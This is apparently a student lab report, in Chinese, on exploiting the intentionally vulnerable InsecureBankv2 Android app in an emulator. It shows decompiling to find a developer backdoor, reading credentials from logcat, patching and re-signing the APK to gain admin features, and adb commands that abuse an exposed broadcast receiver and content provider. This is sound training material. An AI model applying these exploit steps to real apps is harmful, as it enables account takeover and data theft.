# Android 缺陷应用漏洞攻击实验

## 实验目的

- 理解 Android 经典的组件安全和数据安全相关代码缺陷原理和漏洞利用方法；
- 掌握 Android 模拟器运行环境搭建和 `ADB` 使用；

## 实验环境

- [Android-InsecureBankv2](https://github.com/c4pr1c3/Android-InsecureBankv2)

## 实验步骤

说明：实验刚开始一直装不上Android studio（安老师和我都尝试了一个下午，未果），故借用隔壁软工同学的电脑，然后把人家的电脑给搞坏了（模拟器再也打不开）。。。。然后在网上又找了个方法，竟然成功了。所以这个实验报告里既有惠普电脑的路径又有联想电脑的路径。中间失败的次数太多，换了好多次模拟器，模拟器框架可能在每个实验中都有改变。

### Developer Backdoor

0.下载安装JADX decompiler、 dex2jar

1.使用以下命令解压缩最初下载的InsecureBankv2.apk文件的内容:

```
unzip InsecureBankv2.apk
```

<img src="image\unzip.png" />

2.将classes.dex文件复制到dex2jar文件夹。通过运行以下命令使d2j-dex2jar.sh和d2j_invoke.sh文件可执行

```
chmod +x d2j-dex2jar.sh
chmod +x d2j_invoke.sh #授予权限
```

<img src="image\chmod.png" />

3.使用下面的命令将dex文件转换成jar文件，将其从虚拟机中复制粘贴到主机上

```
sh d2j-dex2jar.sh classes.dex
```

<img src="image\sh.png" />

4.下载好jadx后，在jadx的目录中进行编译，成功后会出现BUILD SUCCESSFUL

<img src="image\jadx.png" />

5.使用以下命令在JADX-GUI反编译器中打开生成的dex2jar.jar文件

```
jadx-gui <path to classes-dex2jar.jar>
```

<img src="image\decompiling.png" />

6.下面的屏幕截图显示了Android-InsecureBankv2应用程序中出现的开发人员后门的反编译代码，该应用程序允许用户名为“devadmin”的用户到达与所有其他用户不同的端点。我们发现，无论密码的有效性如何，任何用户都可以使用帐户用户名“devadmin”并以任何密码登录到应用程序

<img src="image\devadmin.png" />

### Insecure Logging

1.将InsecureBankv2.apk文件复制到Android SDK中的“platform-tools”文件夹中，然后使用下面的命令将下载的Android- insecurebankv2应用程序安装到仿真器中。

```
adb install InsecureBankv2.apk
```

<img src="image\push.png" />

可以在模拟器中看到app 

<img src="image\app.png" />

启动服务器

<img src="image\server_start.png" />

2.现在，输入以下命令开始从日志查看模拟器:

```
adb logcat
```

<img src="image\logcat.png" />

3.在模拟器上启动安装的InsecureBankv2应用程序。下面的屏幕截图显示了正常用户登录后可用的默认界面

<img src="image\login界面.png" />

4.输入有效凭证，然后点击“Login”。将其输入到文本中，下面的屏幕快照显示了登录到控制台的凭据。

<img src="image\凭证.png" />

5.导航到“更改密码”页面并输入新的凭据。将其输入到文本中，下面的屏幕截图显示，新的凭据记录在所有应用程序之间共享的控制台上。

<img src="image\新的凭证记录.png" />

### Android Application patching + Weak Auth

0.下载apktool、SignApk，启动**back-end AndroLab server**

<img src="image\server_start.png" />

1.将InsecureBankv2.apk文件复制到Android SDK中的“platform-tools”文件夹中，然后使用下面的命令将下载的Android- insecurebankv2应用程序安装到仿真器中。

```
adb install InsecureBankv2.apk
```

<img src="image\push.png" />

可以在模拟器中看到app 

<img src="image\normal.png" />

2.在模拟器上启动安装的InsecureBankv2应用程序。下面的屏幕截图显示了正常用户登录后可用的默认界面

<img src="image\login1.png" />

3.将InsecureBankv2.apk复制到“apktool”文件夹，然后输入以下命令解压缩应用程序:

```
apktool d InsecureBankv2.apk
```

<img src="image\apktool.png" />

4.导航到~/apktool/InsecureBankv2/res/values文件夹，打开strings.xml文件进行编辑。将“is_admin”的值从“no”修改为“yes”。

<img src="image\adminyes.png" />

5.回到基本apktool文件夹，输入以下命令重新编译应用程序:

```
apktool b InsecureBankv2
```

<img src="image\rebuild.png" />

6.将上面生成的InsecureBankv2.apk文件复制到SignApk的“dist”文件夹中，输入下面的命令对前面测试生成的apk文件进行签名。

```
java -jar sign.jar InsecureBankv2.apk
```

在同一个“dist”文件夹中会生成一个名为insecurebankv2.s.apk的新签名apk文件

<img src="image\resign.png" />

7.将新生成的insecurebankv2.s.apk文件复制到Android SDK中的“platform-tools”文件夹中，然后使用下面的命令将新签名的Android- insecurebankv2应用程序发送到仿真器中。

```
adb install InsecureBankv2.s.apk
```

<img src="image\修改权限后.png" />

8.在Android模拟器中启动新安装的InsecureBankv2应用程序。下面的截图显示，向用户提供了一个附加的“创建用户”按钮，否则该按钮只能用于管理员用户。此按钮以前不可见。

<img src="image\新建用户.png" />

9.单击“创建用户”将用户重定向到用户创建模块。

<img src="image\jump.png" />

### Exploiting Android Broadcast Receivers

1.将InsecureBankv2.apk文件复制到Android SDK中的“platform-tools”文件夹中，然后使用下面的命令将下载的Android- insecurebankv2应用程序安装到仿真器中。

```
adb install InsecureBankv2.apk
```

<img src="image\push.png" />

可以在模拟器中看到app 

<img src="image\app.png" />

2.在模拟器上启动安装的InsecureBankv2应用程序。下面的屏幕截图显示了正常用户登录后可用的默认界面

<img src="image\login界面.png" />

3.将InsecureBankv2.apk复制到“apktool”文件夹，然后输入以下命令解压缩应用程序:

```
apktool d InsecureBankv2.apk
```

4.打开解密后的AndroidManifest.xml文件。下面的屏幕截图显示了应用程序中声明的广播接收器。

<img src="image\广播接收器.png" />

5.使用以下命令解压缩最初下载的InsecureBankv2.apk文件的内容:

```
unzip InsecureBankv2.apk
```

6.将classes.dex文件复制到dex2jar文件夹。通过运行以下命令使d2j-dex2jar.sh和d2j_invoke.sh文件可执行。

```
chmod + x d2j-dex2jar.sh
chmod + x d2j_invoke.sh
```

7.使用下面的命令将dex文件转换成jar文件:

```
sh d2j-dex2jar.sh classes.dex
```

8.使用以下命令在JADX-GUI反编译器中打开生成的类-dex2jar.jar文件:

```
jadx-gui <path to classes-dex2jar.jar>
```

9.下面的屏幕截图显示了传递给先前显示的应用程序中声明的广播接收器的参数。

<img src="image\jadx_kali.png" />

<img src="image\先前声明的参数一.png" />

<img src="image\先前声明的参数二.png" />

10.运行Android仿真器后，将InsecureBankv2.apk文件复制到Android SDK中的“platform-tools”文件夹，然后使用以下命令将下载的Android- insecurebankv2应用程序推送到仿真器。

```
adb install InsecureBankv2.apk
```

11.在模拟器中启动安装的InsecureBankv2应用程序。

12.回到“platform-tools”文件夹，输入以下命令:

```
adb shell
```

13.在shell中输入以下命令:

```
am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 5554 -es newpass Dinesh@123!
```

<img src="image\shell.png" />

14.回到模拟器，导航到“消息”。上面输入的命令会自动调用所述的广播接收方，并发送带有密码的SMS文本。这样就利用Android广播接收器更改了密码

<img src="image\发送短信.png" />

### Exploiting Android Content Provider

1.将InsecureBankv2.apk文件复制到Android SDK中的“platform-tools”文件夹中，然后使用下面的命令将下载的Android- insecurebankv2应用程序推送到仿真器中。

```
adb install InsecureBankv2.apk
```

2.在模拟器上启动安装的InsecureBankv2应用程序。

3.首先以用户“dinesh”(dinesh/Dinesh@123$)身份登录应用程序，然后以用户“jack”(jack/ jack @123$)身份登录。

4.将InsecureBankv2.apk复制到“apktool”文件夹，然后输入以下命令解压缩应用程序:

```
 apktool d InsecureBankv2.apk
```

5.打开解密后的AndroidManifest.xml文件。下面的屏幕截图显示了应用程序中声明的接收器。

<img src="image\接收器.png" />

6.使用以下命令解压缩最初下载的InsecureBankv2.apk文件的内容:

```
unzip InsecureBankv2.apk
```

7.将classes.dex文件复制到dex2jar文件夹。通过运行以下命令使d2j-dex2jar.sh和d2j_invoke.sh文件可执行。

```
chmod + x d2j-dex2jar.sh
chmod + x d2j_invoke.sh
```

8.使用下面的命令将dex文件转换成jar文件:

```
sh d2j-dex2jar.sh classes.dex
```

9.使用以下命令在JADX-GUI反编译器中打开生成的类-dex2jar.jar文件:

```
jadx-gui <path to classes-dex2jar.jar>
```

10.下面的屏幕截图显示了传递给先前显示的应用程序中声明的内容提供者的相关参数。

<img src="image\trackerusers参数.png" />

11.运行Android仿真器后，将InsecureBankv2.apk文件复制到Android SDK中的“platform-tools”文件夹，然后使用以下命令将下载的Android- insecurebankv2应用程序推送到仿真器。

```
adb install InsecureBankv2.apk
```

12.在模拟器上启动安装的InsecureBankv2应用程序。

13.回到“platform-tools”文件夹，输入以下命令:

```
adb shell
```

14.在终端输入以下命令:

```
adb shell
```

15.在Android shell中输入以下命令:

```
content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

下面的屏幕截图显示，所有用户的登录历史记录都未加密地存储在设备上。

<img src="image\登陆历史.png" />

## 遇到的问题

* 查看文档进行实验时，在word中复制粘贴命令时易产生多余的字符（可能是格式原因）导致命令出错

在网上搜索命令后自己按照格式重新敲一遍即可

* 使用sign.jar签名时出错

<img src="image\error.png" />

sign包出错，把舍友的拷贝过来就好了

* InsecureBankv2.apk包安装出错

模拟器版本过高，换一个版本旧一点的即可

* 日志中报错连接不到服务器

<img src="image\无法连接服务器.png" />

将软件的ip设置成修改成自己主机的ip地址

* 启动服务器时无法运行app.py

逐行修改不符合语法部分，再运行

<img src="image\修改python文件.png" />

## 参考资料

1.[Android-InsecureBankv2](https://github.com/c4pr1c3/Android-InsecureBankv2)

2.[**ADB 操作命令详解及用法大全**](https://juejin.im/post/5b5683bcf265da0f9b4dea96)

3.[[python - ImportError: cannot import name wsgiserver](https://stackoverflow.com/questions/59372836/python-importerror-cannot-import-name-wsgiserver)](https://stackoverflow.com/questions/59372836/python-importerror-cannot-import-name-wsgiserver)

4.[**Android studio :Error:Cause: unable to find valid certification path to requested target**](https://www.jianshu.com/p/0fd7ed2ffe82)

5.[**Android Studio出现:Cause: unable to find valid certification path to requested target**](https://blog.csdn.net/qq_17827627/article/details/99404177)